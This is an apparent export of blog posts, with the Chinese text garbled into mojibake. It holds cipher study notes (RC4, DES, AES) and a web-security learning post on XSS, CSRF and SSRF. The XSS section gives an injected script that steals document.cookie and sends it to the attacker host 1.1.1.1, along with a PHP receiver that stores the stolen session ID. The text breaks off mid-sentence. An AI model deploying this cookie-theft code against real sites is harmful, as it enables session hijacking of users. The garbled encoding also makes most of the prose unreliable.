å›¾è¯´æ˜ä¸€åˆ‡\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454647.png)\n\n### (2)Permutation cipherï¼š\n\n- ç»™å®šå¯†é’¥ï¼ŒæŒ‰å­—æ¯è¡¨æ’åˆ—é¡ºåºã€‚ä¾‹å¦‚keyï¼Œé¡ºåºä¸º(2 1 3)ã€‚\n\n- ä¾æ®å¯†é’¥é•¿åº¦åˆ†ç»„æ˜æ–‡ï¼Œä¸è¶³è¡¥æŒ‡å®šå­—ç¬¦ã€‚ä¾‹å¦‚Permutation cipherï¼Œåˆ†ä¸ºPer mut ati onc iph erx(æœ€åè¡¥äº†x)\n\n- æ ¹æ®å¯†é’¥é¡ºåºç½®æ¢ï¼Œ(2 1 3)å³ä»£è¡¨ç¬¬äºŒä¸ªå­—æ¯æ”¾åˆ°ç¬¬ä¸€ä¸ªï¼Œç¬¬ä¸€ä¸ªå­—æ¯æ”¾åˆ°ç¬¬äºŒä¸ªï¼Œç¬¬ä¸‰ä¸ªå­—æ¯æ”¾åˆ°ç¬¬ä¸‰ä¸ªã€‚å¯å¾—ePr umt tai noc pih rexå³ä¸ºæ‰€æ±‚å¯†æ–‡ã€‚\n\n### (3)Column Permutation cipherï¼š\n\n- ç»™å®šå¯†é’¥ï¼ŒæŒ‰å­—æ¯è¡¨æ’åˆ—é¡ºåºã€‚ä¾‹å¦‚keyï¼Œé¡ºåºä¸º(2 1 3)ã€‚\n\n- ä¾æ®å¯†é’¥é•¿åº¦åˆ†ç»„æ˜æ–‡ï¼Œç«–å‘æ’åˆ—ã€‚ä¾‹å¦‚Permutation cipherï¼Œåˆ†ä¸º\n\n```\n#æ³¨é‡Šå¤´\n\n213\nPer \nmut \nati \nonc \niph \ner\n```\n\n- ä¾æ®é¡ºåºå°†åˆ—ç«–å‘æå–ï¼Œæ¨ªå‘ç”Ÿæˆå¯†æ–‡ï¼šeutnpr Pmaonie rtichå³ä¸ºæ‰€æ±‚å¯†æ–‡ã€‚\n\n### (4)Double Permutation cipherï¼š\n\nä¸€æ ·ï¼Œåªæ˜¯é‡å¤ä¸¤æ¬¡\n\n \n\n# ç¬¬ä¸‰ç«  æµå¯†ç  \n\nStream Cipher ç”Ÿæˆ\n\n## 1.LFSRï¼š\n\nç»™å®šåˆå§‹å€¼ï¼ŒæŒ‡å®šåé¦ˆä½å¼‚æˆ–ç”Ÿæˆä»å·¦è¾¹è¿›å…¥ï¼Œä»å³è¾¹å‡ºæ¥ç”Ÿæˆç”Ÿæˆå¯†é’¥æµï¼Œè¿™é‡Œå°±ä¼šæ˜¯101011 00....\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455530.png)\n\nâ˜†é’ˆå¯¹LFSRæ”»å‡»ï¼šå°†å¯†æ–‡é€ä¸¤ä¸ªå¼‚æˆ–å¾—åˆ°åˆ†ææ®µï¼Œå¦‚å›¾ç¬¬ä¸€æ®µä¸ºå¯†æ–‡æ®µï¼Œç¬¬äºŒæ®µä¸ºåˆ†ææ®µï¼Œå…¶ä¸­é‡å¤éƒ¨åˆ†ç›¸è·çš„é•¿åº¦å³ä¸ºLFSRçš„ä¸¤ä¸ªçº¿æ€§åé¦ˆä½çš„é•¿åº¦ï¼Œè¿™é‡Œæ˜¯4ï¼Œå¦‚ä¸Šå›¾çš„LFSRï¼Œä¹‹åå†åˆ†æç ´è§£ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454156.png)\n\n## 2.RC4ï¼š\n\n- åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„S[]ï¼Œä¸€èˆ¬ä¸º0-255ï¼Œè¿™é‡Œå‡è®¾ä¸º0-7ï¼ŒS[]:[0,1,2,3,4,5,6,7]ã€‚ä¹‹ååˆå§‹åŒ–ä¸€ä¸ªkeyé¡ºåºæ•°ç»„K[]ç»™å®šåˆå§‹å¯†é’¥é¡ºåºï¼Œå‡è®¾ä¸º567ï¼Œé‡å¤è‡³8ä½K[]:[5,6,7,5,6,7,5,6]ã€‚\n\n- é€šè¿‡KSAç®—æ³•ä»£ç ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nj = 0 \nfor i in range(0,255):\n    j = (j + S[i] + K[i])mod 256 \n    tmp = S[i]\n    S[i] = S[j]\n    S[j] = tmp\n```\n\nä¸Šè¿°ä¾‹å­å¾—åˆ°æ–°çš„S[]:[5,4,0,7,1,6,3,2]\n\n- é€šè¿‡PRGAç®—æ³•ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ni = 0\nj = 0\ni = (i + 1)mod 256\nj = (j + S[i]) mod 256\n\ntmp = S[i] \nS[i] = S[j] \nS[j] = tmp\n\nt = (S[j] + S[i])mod 256\nk = S[t]\n```\n\nä¸Šè¿°ä¾‹å­å¾—åˆ°K = 6ï¼Œä¹‹åé‡å¤8æ¬¡(n)ï¼Œå³å¯å¾—åˆ°æœ€ç»ˆå¯†é’¥K\n\n \n\n## 3.CAï¼šcellular automata\n\nç»†èƒè‡ªåŠ¨æœº\n\n### (1)1D\n\nå³ä¸€ç»´çš„ï¼š\n\n- ç»™å®šåˆå§‹çŠ¶æ€(ä¸€èˆ¬éšæœºç”Ÿæˆ)ï¼Œè¿™é‡Œé€‰ä¸º0010100(å¤šå°‘bitéƒ½è¡Œ)ã€‚\n\n- ç»™å®šçŠ¶æ€è½¬æ¢è§„åˆ™ï¼Œä¸€èˆ¬ç»™ä¸€ä¸ªåè¿›åˆ¶æ•°å­—ï¼Œç„¶åè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œè¿™é‡Œé€‰ä¸º23ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n000 001 010 011 100 101 110 111\n 0   0   0   1   0   1   1   1   = 23\n```\n\n- ä¾æ®è§„åˆ™æ¼”å˜è‡³ä¸‹ä¸€ä¸ªçŠ¶æ€(ä¾æ®å½“å‰ä½å’Œå·¦å³é‚»ä½)ï¼Œé‚£ä¹ˆåˆå§‹çŠ¶æ€å°±å¯ä»¥å¯¹åº”ä»¥ä¸‹ä¸ƒç§çŠ¶æ€ï¼š\n\n000 001 010 101 010 100 000\n\nä¾æ®è§„åˆ™è½¬åŒ–ä¸º 0001000ï¼Œå³ä¸ºåˆå§‹çŠ¶æ€çš„ä¹‹åçš„ç¬¬ä¸€ä¸ªçŠ¶æ€ã€‚ä¾æ®æ­¤è§„åˆ™å¯æ¼”å˜å‡ºå¤šç§çŠ¶æ€ã€‚\n\n- å†è®¾å®šè§„åˆ™ï¼Œä»æ¯ä¸ªçŠ¶æ€ä¸­å–ç¬¬xä½ä½œä¸ºå¯†é’¥ï¼Œé‚£ä¹ˆnä¸ªçŠ¶æ€å°±ä¼šå¯¹åº”ç”Ÿæˆnä½çš„keyã€‚\n\n### (2)2D\n\nå³äºŒç»´çš„ï¼šåŸç†ç±»ä¼¼ï¼Œç»™å®šåˆå§‹çŠ¶æ€ä¸è§„åˆ™ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454153.png)\n\nè¿™é‡Œçš„Von Neumann Neighborhoodå’ŒMoore Neighborhoodå¯¹åº”ä¸¤ç§ä¸åŒçš„é‚»å±…é€‰æ‹©è§„åˆ™ã€‚\n\nâ–²è§„åˆ™ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455128.png)\n\nè¿™é‡Œçš„Xä¸ºè‡ªå®šä¹‰çš„ä¸€ä¸ªåˆå§‹å€¼0æˆ–1ï¼Œä¹‹åçš„CNSWEåˆ†åˆ«å¯¹åº”è‹±æ–‡certerï¼Œnorthï¼Œsouthï¼Œwestï¼Œeastï¼Œå³ä¸­ä¸Šä¸‹å·¦å³ï¼ŒåŠ ä¸Šæ˜¯ä¸€ä¸ªç»™å®šçš„è§„åˆ™ï¼Œä¾‹å¦‚é€‰å®šï¼š(XCNSWE)ä¸º(001110)=14ï¼Œé‚£ä¹ˆ14å³ä¸ºç»™å®šçš„è§„åˆ™ã€‚\n\nSi,j(t)å³ä¸ºå½“å‰çŠ¶æ€åˆ†åˆ«å¯¹åº”çš„0æˆ–1çš„å€¼ï¼Œä¾æ®ä¸Šè¿°ç­‰å¼ç®—å‡ºä¸‹ä¸€çŠ¶æ€çš„å€¼å³å¯ã€‚(è¿™é‡Œæ˜¯Von Neumann Neighborhood)\n\nâ˜†é’ˆå¯¹æµå¯†ç æ”»å‡»ï¼šæ’å…¥æ˜æ–‡æ”»å‡»ï¼Œå‡è®¾æ”»å‡»è€…å¯ä»¥æ’å…¥1bitçš„æŒ‡å®šæ˜æ–‡ï¼Œå†æ¬¡è¿›è¡Œå‘é€ï¼Œç„¶åä¹Ÿå¯ä»¥æˆªè·åˆ°å¯†æ–‡ï¼Œé‚£ä¹ˆå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454656.png)  ç¬¬ä¸€æ¬¡(åªçŸ¥é“å¯†æ–‡Ci)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455603.png)ç¬¬äºŒæ¬¡æ’å…¥på(çŸ¥é“å¯†æ–‡Ciå’Œpã€c)\n\nç°åœ¨å¯ä»¥é€šè¿‡p^cç®—å‡ºk2ï¼Œå¸¦å…¥ç¬¬ä¸€å¼ å›¾ï¼Œc2^k2ç®—å‡ºp2ï¼Œå†å¸¦å…¥ç¬¬äºŒå¼ å›¾p2^c3ç®—å‡ºk3ï¼Œä¾æ¬¡ç±»æ¨å¯å¾—åˆ°å…¨éƒ¨ï¼Œé™¤äº†p1,k1,c1ã€‚\n\n \n\n \n\n# ç¬¬å››ç«  åˆ†ç»„å¯†ç \n\n## 1.DESåŠ å¯†(Data Encryption Standard)ï¼š\n\n### (1)å¯†é’¥ç”Ÿæˆï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454854.png)\n\n- 64ä½å¯†é’¥ï¼Œå…¶ä¸­8ä½ä¸ºå¥‡å¶æ ¡éªŒä½ï¼Œç”Ÿæˆå­å¯†é’¥è¿‡ç¨‹ä¸­éœ€è¦å‰”é™¤ï¼Œç»è¿‡PC-1å‹ç¼©å¾—åˆ°k(56bit)\n- å°†kåˆ†ä¸ºKL0å’ŒKR0ï¼Œå„28bit\n- KL0å’ŒKR0å·¦ç§»xä½å¾—åˆ°KL0x,KR0x\n- å°†KL0xå’ŒKR0xåˆå¹¶ï¼Œé€šè¿‡PC-2ç½®æ¢å¾—åˆ°å­å¯†é’¥K0(48bit)\n- å°†KL0xå’ŒKR0xæ‹·è´ä¸€ä»½å¾—åˆ°ä¸‹ä¸€è½®çš„KL1å’ŒKR1\n\né‡å¤3-5æ­¥16è½®ï¼Œå…±å¾—åˆ°k0-k15ä¸ªå­å¯†é’¥ä»¥ä¾›åŠ å¯†\n\n### (2)åŠ å¯†æµç¨‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454057.png)\n\n- ä»¥8ä¸ªå­—æ¯ä¸ºä¸€ä¸ªå•ä½å–æ˜æ–‡\n- å°†ä¸€å•ä½æ˜æ–‡é€šè¿‡ITæ‰“ä¹±å¾—åˆ°Y0\n- å–Y0å·¦è¾¹32ä½ä¸ºPL0,å³è¾¹32ä½ä¸ºPR0\n- å°†PR0å¤åˆ¶ä¸€ä»½ä¸ºL1-------ç”¨ä½œä¸‹ä¸€è½®çš„L\n- å°†PR0ç”¨EBOXæ‰©å±•ç½®æ¢å¾—åˆ°EPR0(48bit)\n- å°†EPR0ä¸K0å¼‚æˆ–å¾—åˆ°K_X_P(48bit)\n- å°†K_X_Pç”¨SBOXå‹ç¼©å¾—åˆ°SPR0(32bit)\n- å°†SR0ä¸PBOXè¿›è¡Œç½®æ¢å¾—åˆ°PPR0\n- å°†PPR0ä¸L0å¼‚æˆ–å¾—åˆ°ä¸‹ä¸€è½®çš„PR1\n\né‡å¤4-9æ­¥16è½®(å…¶ä¸­fè½®å‡½æ•°å³ä¸ºEBOXã€Keyå¼‚æˆ–ã€SBOXã€PBOX)\n\nâ–²å¾—åˆ°PR15å’ŒL15ï¼Œå·¦å³äº¤æ¢ååˆå¹¶åœ¨ä¸€èµ·åå†ç»è¿‡IPé€†è¿ç®—æœ€ç»ˆç½®æ¢å¾—åˆ°å¯†æ–‡\n\n### (3)BOXäº‹é¡¹ï¼š\n\n#### â‘ EBOXï¼š\n\nè™½è¯´æ˜¯æ‰©å±•ï¼Œä½†ç›´æ¥ä¾æ®é¡ºåºæ‰©å±•å³å¯ã€‚å‰bit->åbitï¼Œåbit->å‰bitã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454861.png)\n\n#### â‘¡SBOXï¼š\n\n8ä¸ªå­BOXï¼Œæ¯ä¸ªå­BOXä¸º4Ã—16çŸ©é˜µï¼Œæ¯è¡Œ0-15ä»¥æŸä¸ªå›ºå®šé¡ºåºæ’åˆ—ï¼Œé€šè¿‡æ—¶48bitåˆ†ä¸º8ä¸ªå—ï¼Œæ¯ä¸ªå—6bitã€‚é¦–å°¾bitæ‹¼åˆä¸ºrowï¼Œä¸­é—´4bitæ‹¼åˆä¸ºcolumnï¼Œä¾æ®(row,column)æ¥åœ¨æ¯ä¸ªå­BOXä¸­æ‰¾åˆ°å¯¹åº”çš„æ•°å­—åè½¬æ¢ä¸ºäºŒè¿›åˆ¶å³ä¸º4bitè¾“å‡ºã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454267.png)\n\nä¹‹åIP,IPé€†,PBOXéƒ½æ˜¯æ­£å¸¸çš„ç½®æ¢BOXã€‚\n\nâ–²è§£å¯†æµç¨‹å®Œå…¨ç›¸åŒï¼Œåªæœ‰å¯†é’¥ä½¿ç”¨é¡ºåºç›¸åã€‚\n\n \n\n## 2.SDESåŠ å¯†ï¼š\n\nSimpleï¼Œç±»ä¼¼ï¼Œä¸è¿‡åªæœ‰ä¸¤è½®ï¼Œä½æ•°ä¹Ÿä¸å¤ªä¸€æ ·ï¼Œåˆ†åˆ«å¾ªç¯å·¦ç§»1bitå’Œ2bitã€‚å„ç§å­BOXä¹Ÿä¼šå¯¹åº”ä¿®æ”¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454258.png)\n\n \n\n## 3.AESåŠ å¯†(Advanced Encryption Standard):\n\nâ–²æœ‰128bitï¼Œ192bitå’Œ...å¿˜äº†...ä»¥ä¸‹ä»¥128bitä¸ºä¾‹å­\n\n### (1)å¯†é’¥ç”Ÿæˆï¼š\n\n#### â‘ å‰æœŸè®¡ç®—\n\n- 128bitåˆ†ä¸º16å­—èŠ‚ç«–å‘æ’åˆ—ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nW0 W1 W2  W3 ..........\n-------------------------------------------------------\nK0 K4 K8  K12\nK1 K5 K9  K13\nK2 K6 K10 K14\nK3 K7 K11 K15\n```\n\n- ä¾æ®è§„åˆ™è®¡ç®—W[4]è‡³W[43]ï¼š\n\nW[i] = W[i-4] xor W[i-1]     iä¸ä¸º4çš„å€æ•°æ—¶\n\nW[i] = W[i-4] xor T(W[i-1])  iä¸º4çš„å€æ•°æ—¶\n\n#### â‘¡è®¡ç®—T(W[i-1]):\n\n- å°†W[i-1]ä¸­å­—èŠ‚å…ƒç´ æ¨ªå‘æ’åˆ—ï¼Œå¾ªç¯å·¦ç§»1ä¸ªå­—èŠ‚ã€‚\n\n- å°†å¾ªç¯å·¦ç§»åçš„å››ä¸ªå­—èŠ‚é€šè¿‡SBOXï¼Œå¾—åˆ°[S0,S1,S2,S3]å››ä¸ªå­—èŠ‚åˆ—è¡¨ã€‚(è¿™ä¸ªSBOXä¸º16Ã—16çŸ©é˜µï¼Œéœ€è¦å°†æ¯ä¸ªå­—èŠ‚çš„å‰4bitä½œä¸ºrowï¼Œå4bitä½œä¸ºcolumnï¼Œ(row,column)æ¥åœ¨SBOXä¸­å¯»æ‰¾å¯¹åº”å­—èŠ‚æ›¿æ¢)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454567.png)\n\n- è®¡ç®—å¸¸é‡ï¼šr[i] = 2^((i-4)/4)\n\n- æœ€ç»ˆT(W[i-1]) = [S0 xor r(i),S1,S2,S3]\n\nå³å¯æ±‚å¾—W[0]-W[43]å…±è®¡44ä¸ªW[i]å¯†é’¥ã€‚\n\n### (2)åŠ å¯†æµç¨‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454120.png)\n\n128bitè¾“å…¥ï¼Œå¾ªç¯9è½®ï¼Œç¬¬10è½®ä¸­æ²¡æœ‰MixColumnã€‚\n\n### (3)BOXæ³¨æ„ï¼š\n\n- KeyAddï¼šæ­£å¸¸çš„128bitå¯†é’¥å’Œ128bitæ˜æ–‡å—å¼‚æˆ–ã€‚\n\n- Substitutionï¼šå³SBOXï¼Œä¸º\n\n \n\n \n\n \n\n \n\n \n\n \n","tags":["å­¦ä¹ "],"categories":["å­¦ä¹ "]},{"title":"æŠ¤ç½‘Webå­¦ä¹ ","url":"/2021/08/14/æŠ¤ç½‘Webå­¦ä¹ /","content":"\nå·æºœæ¥äº†æŠ¤ç½‘ï¼Œå¸Œæœ›ä¸ä¼šè¢«é€®ä½.....\n\nâ–²å…¶å®å†³å®šæ¥ä¹‹å‰å‹æ ¹å°±ä¸ä¼šWebï¼Œè¿HTMLï¼ŒCSSï¼ŒPHPç­‰ç­‰æœ€åŸºç¡€çš„ä¸œè¥¿éƒ½ä¸äº†è§£ã€‚å†³å®šè¦æ¥ä¹‹åï¼Œå°±æŠ½ç©ºå­¦äº†ä¸€äº›ç®€å•çš„å®é™…æ¸—é€æ–¹é¢çš„Webåˆ©ç”¨ï¼Œåƒä¹‹å‰å†™çš„æ°¸æ’ä¹‹è“ï¼Œsqlmapï¼Œnmapï¼ŒBurpsuiteï¼ŒARPå•¥çš„éƒ½æ˜¯é‚£ä¸€å°æ®µæ—¶é—´ç–¯ç‹‚è¡¥çš„ä¸œè¥¿ã€‚ç„¶åæœŸé—´ç»å†äº†ä¸€ç‚¹å°æ’æ›²ï¼Œæœ¬æ¥ä»¥ä¸ºä¸ä¼šæ¥äº†ï¼Œé˜´å·®é˜³é”™åˆè¿‡æ¥äº†ã€‚å’Œæˆ‘ä¸€ä½å­¦Webå¼€å‘çš„å‚»å˜šä¸€èµ·æ¥çš„\n\n# ä¸€ã€HTMLã€CSSã€PHPåŸºç¡€ï¼š\n\nhttps://www.w3school.com.cn/\n\nä¸œè¥¿å¤ªæ‚ï¼Œé€‚å½“äº†è§£åŸç†ï¼Œä»¥åå³ç”¨å³å­¦ã€‚\n\n \n\n# äºŒã€XSSæ”»å‡»ï¼šè·¨ç«™è„šæœ¬ï¼ˆCross-Site Scriptingï¼‰\n\nå››ç§ç±»å‹ï¼Œå¤§æ¦‚å¦‚ä¸‹\n\n## 1.åŸç†è§£æï¼š\n\n(1)é»‘å®¢é€šè¿‡æŸç½‘ç«™æ¼æ´ï¼Œå°†æ¶æ„ä»£ç æ³¨å…¥åˆ°æŸç½‘ç«™ä¸­ï¼Œç”Ÿæˆç±»ä¼¼å›¾ç‰‡ï¼Œç•™è¨€ç­‰è¿›è¡Œä¼ªè£…ï¼Œå†…åœ¨æ˜¯æ”»å‡»é“¾æ¥ã€‚\n\n(2)ç”¨æˆ·è®¿é—®è¯¥ç½‘ç«™ï¼Œæ— æ„ä¸­ç‚¹å‡»äº†è¯¥å›¾ç‰‡ï¼Œç•™è¨€ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œäº†è¿™æ®µæ¶æ„ä»£ç ï¼Œè¿›å…¥äº†æ”»å‡»é“¾æ¥ï¼Œæ³„éœ²ä¿¡æ¯ã€‚\n\n## 2.ä¾‹å­ï¼š\n\n### (1)åŸç½‘ç«™çš„HTMLï¼š\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xssæ”»å‡»</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\nç•™è¨€ï¼š<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='æäº¤'>\n</form>\n<br/>ç•™è¨€è®°å½•ï¼š<br/>\n```\n\nåç¼€æ”¹ä¸ºhtmlï¼Œæ‰“å¼€åå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450943.png)\n\n### (2)æŸäº›æ‰‹æ®µä¿®æ”¹åå¦‚ä¸‹ï¼š\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n    <title>xssæ”»å‡»</title>\n</head>\n<body>\n<form action=\"./test.php\" method=\"post\">\nç•™è¨€ï¼š<input type=\"text\" name=\"content\" value=\"\"><br/>\n<input type=\"submit\" name=\"\" value='æäº¤'>\n</form>\n<br/>ç•™è¨€è®°å½•ï¼š<br/>\n\n<script>\nvar Str=document.cookie;                        //è·å–cookie\nvar a =document.createElement('a');             //åˆ›å»ºaæ ‡ç­¾\na.href='http://1.1.1.1/attack.php?'+Str;        //æ”»å‡»è€…ä¸»æœº\na.innerHTML=\"<img src='./aa.jpg'>\";             //æ©æŠ¤å›¾ç‰‡\ndocument.body.appendChild(a);                   //å°†æ ‡ç­¾æ·»åŠ åˆ°é¡µé¢ä¸­\n</script>\n</body>\n</html>\n```\n\næ‰“å¼€åå¦‚ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450848.png)\n\n### (3)æ”»å‡»è·³è½¬\n\nå½“ä¸å°å¿ƒç‚¹åˆ°è¯¥å›¾ç‰‡åï¼Œä¼šè·³è½¬åˆ°http://1.1.1.1/attack.php?Strè¿™ä¸ªURLç•Œé¢ï¼Œè·³å‡ºå¦‚ä¸‹ç•Œé¢ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450006.png)\n\nå…¶ä¸­arrayä¸­å°±æ˜¯è®¿é—®è¯¥ç½‘ç«™æ‰€å¾—åˆ°çš„cookieä»¤ç‰Œã€‚\n\næ”»å‡»è€…çš„attack.phpä»£ç å¦‚ä¸‹ï¼š\n\n```\n<?php\nheader(\"content-type:text/html;charset=utf8\");\necho \"ä½ çš„PHPSESSIDè¢«ç›—å•¦\";\necho \"<pre>\";\nprint_r($_GET);\necho \"</pre>\";\n$cookie=$_GET['PHPSESSID'];\nfile_put_contents('./xss.txt', $cookie);\n?>\n```\n\næ”»å‡»è€…å°†å¾—åˆ°çš„cookieå­˜å‚¨åˆ°ä»–æœåŠ¡å™¨1.1.1.1çš„xss.txtæ–‡ä»¶ä¸­ï¼Œä¹‹åæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨ä»ç”¨æˆ·è¿™å¾—åˆ°çš„cookieæ¥å‡è£…ç”¨æˆ·æˆåŠŸç™»å½•ç½‘ç«™ã€‚\n\n## 3.é˜²å¾¡æ‰‹æ®µï¼š\n\nè¿‡æ»¤è¾“å…¥ï¼Œæœ€æœ‰æ•ˆçš„ã€‚\n\n \n\n# ä¸‰ã€CSRFæ”»å‡»ï¼š\n\nè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼‰\n\n## 1.åŸç†è§£æï¼š\n\n- ç”¨æˆ·Cæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®å—ä¿¡ä»»ç½‘ç«™Aï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¯·æ±‚ç™»å½•ç½‘ç«™Aï¼›\n\n- åœ¨ç”¨æˆ·ä¿¡æ¯é€šè¿‡éªŒè¯åï¼Œç½‘ç«™Aäº§ç”ŸCookieä¿¡æ¯å¹¶è¿”å›ç»™æµè§ˆå™¨ï¼Œæ­¤æ—¶ç”¨æˆ·ç™»å½•ç½‘ç«™AæˆåŠŸï¼Œå¯ä»¥æ­£å¸¸å‘é€è¯·æ±‚åˆ°ç½‘ç«™Aï¼›\n\n- ç”¨æˆ·æœªé€€å‡ºç½‘ç«™Aä¹‹å‰ï¼Œåœ¨åŒä¸€æµè§ˆå™¨ä¸­ï¼Œæ‰“å¼€ä¸€ä¸ªTABé¡µè®¿é—®ç½‘ç«™Bï¼Œè¿™ä¸ªç½‘ç«™Bå°±æ˜¯é»‘å®¢ç”¨æ¥æ”»å‡»çš„è‡ªå·±æ­å»ºçš„ä¸€ä¸ªç½‘ç«™ï¼Œæˆ–è€…æ˜¯é»‘å®¢æ’å…¥æ”»å‡»ä»£ç çš„ç½‘ç«™ï¼›\n\n- è®¿é—®ç½‘ç«™Båï¼Œæ¥æ”¶åˆ°ç”¨æˆ·è¯·æ±‚å(é»‘å®¢æ’å…¥çš„é“¾æ¥æˆ–è€…æ˜¯é»‘å®¢è‡ªå»ºçš„ç½‘ç«™ï¼Œå‰è€…éœ€è¦ç”¨æˆ·ç‚¹å‡»æ¶æ„ä»£ç é“¾æ¥ï¼Œç±»ä¼¼äºXSSæ”»å‡»ï¼Œåè€…åˆ™ä¸éœ€è¦)ï¼Œè¿”å›ä¸€äº›æ”»å‡»æ€§ä»£ç ï¼Œå¹¶å‘å‡ºä¸€ä¸ªè¯·æ±‚è¦æ±‚è®¿é—®ç¬¬ä¸‰æ–¹ç«™ç‚¹Aï¼›\n\n- æµè§ˆå™¨åœ¨æ¥æ”¶åˆ°è¿™äº›æ”»å‡»æ€§ä»£ç åï¼Œæ ¹æ®ç½‘ç«™Bçš„è¯·æ±‚ï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æºå¸¦Cookieä¿¡æ¯ï¼Œå‘ç½‘ç«™Aå‘å‡ºè¯·æ±‚ã€‚ç½‘ç«™Aå¹¶ä¸çŸ¥é“è¯¥è¯·æ±‚å…¶å®æ˜¯ç”±Bå‘èµ·çš„ï¼Œæ‰€ä»¥ä¼šæ ¹æ®ç”¨æˆ·Cçš„Cookieä¿¡æ¯ä»¥Cçš„æƒé™å¤„ç†è¯¥è¯·æ±‚ï¼Œå¯¼è‡´æ¥è‡ªç½‘ç«™Bçš„æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚\n\nâ–²ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨æ¶æ„ç½‘ç«™ä½¿å¾—ç”¨æˆ·æµè§ˆå™¨æºå¸¦cookieå’Œæ¶æ„ä»£ç è¯·æ±‚æ¥ç™»å½•æ­£å¸¸ç½‘ç«™ï¼Œè¿™æ ·é»‘å®¢çš„æ¶æ„ä»£ç è¯·æ±‚å°±å¯ä»¥åœ¨è¯¥ç½‘ç«™è¢«æ‰§è¡Œï¼Œä»è€Œä½¿å¾—é»‘å®¢å¯ä»¥ä¼ªè£…æˆç”¨æˆ·æ¥æ‰§è¡Œä»»æ„æ“ä½œï¼Œäº‹åçœ‹åˆ°çš„ä¹Ÿåªæ˜¯è¯¥ç”¨æˆ·çš„æ­£å¸¸è¯·æ±‚æ“ä½œï¼ŒåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆæ”»å‡»ç—•è¿¹ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191450927.png)\n\n## 2.å®ä¾‹è§£æï¼š\n\nä¸æäº†ï¼ŒDVWAä¸Šå¾ˆå¤šã€‚\n\n \n\n# å››ã€SSRFæ”»å‡»ï¼š\n\nServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ \n\n## 1.åŸç†è§£æï¼š\n\næ¯”è¾ƒç®€å•ï¼Œå¸¸ç”¨æ¥å¤–ç½‘å°†æœåŠ¡å™¨å½“è·³æ¿æ¥æ¢æµ‹å†…ç½‘ã€‚\n\n- åˆ©ç”¨æœåŠ¡å™¨æä¾›çš„åŠŸèƒ½ï¼Œè¾“å…¥urlè·å–å›¾ç‰‡ï¼Œè¾“å…¥æŸipæŸ¥æ‰¾ä¿¡æ¯ç­‰ç­‰ã€‚\n\n- æ„é€ æˆ‘ä»¬éœ€è¦çš„urlï¼Œæˆ–è€…ä¸€äº›é“¾æ¥ï¼ŒæœåŠ¡æ¥è·å–æˆ‘ä»¬æƒ³è¦çŸ¥é“çš„ä¿¡æ¯ã€‚\n\n## 2.å®ä¾‹è§£æï¼š\n\nä¸æäº†ï¼ŒDVWAä¸Šå¾ˆå¤šã€‚\n\nåé¢æœ‰æ—¶é—´å†æ€»ç»“ä¸‹å§ï¼Œå¾—æ»šå»è¡¥è½ä¸‹çš„ä¸œè¥¿äº†ã€‚\n\n \n\n# äº”ã€æ€»ç»“æœ”æºï¼š\n\n- é¦–å…ˆå¾—åˆ°ipï¼Œå…ˆæŒ‚clashå’Œproxifierå…¨å±€ä»£ç†å®‰æ’ä¸Šã€‚\n\n- IPIP.net  ip138.comç­‰æŸ¥è¯¥ipä¸‹é¢ç»‘äº†å•¥åŸŸåï¼Œå¯¹åº”å¼€äº†ä»€ä¹ˆwebæœåŠ¡ã€‚\n\n- å…ˆPingä¸€ä¸‹IPç»‘å®šçš„åŸŸåï¼Œçœ‹çœ‹æœ€ç»ˆçš„webæœåŠ¡æ˜¯ä¸æ˜¯æŒ‚åœ¨è¯¥IPä¸‹ã€‚ç„¶åæ‹¿ç›®å½•æ‰«æå™¨å¼€å§‹æ‰«è¿™ä¸ªipå¼€çš„webæœåŠ¡ï¼Œéœ€è¦å­—å…¸å’Œå·¥å…·ã€‚\n\n- æ 